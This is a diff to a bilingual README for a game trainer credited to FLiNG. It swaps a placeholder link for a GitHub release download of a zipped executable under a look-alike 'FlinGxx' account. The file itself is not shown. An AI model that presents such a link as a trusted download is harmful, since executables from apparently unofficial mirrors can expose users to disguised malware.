@@ -1,6 +1,6 @@
 # 🌑 Clair Obscur: Expedition 33 – Trainer v1.0 Plus 10 by FLiNG
 
-**📥 Download / Скачать:** [Click here to download the Trainer (EXE)](https://example.com/download-clair-obscur-trainer)
+**📥 Download / Скачать:** [Click here to download the Trainer (EXE)](https://github.com/FlinGxx/Clair-Obscur-Expedition-33-Trainer-v1.0-Plus-10-by-FLiNG/releases/download/Clair-Obscur-Expedition-33-Trainer/Clair.Obscur.Expedition.33.Trainer.v1.0.Plus.10.by.FLiNG.zip)
 
 **🧠 Developed by:** FLiNG  
 **🖥️ Game Version:** v1.0  
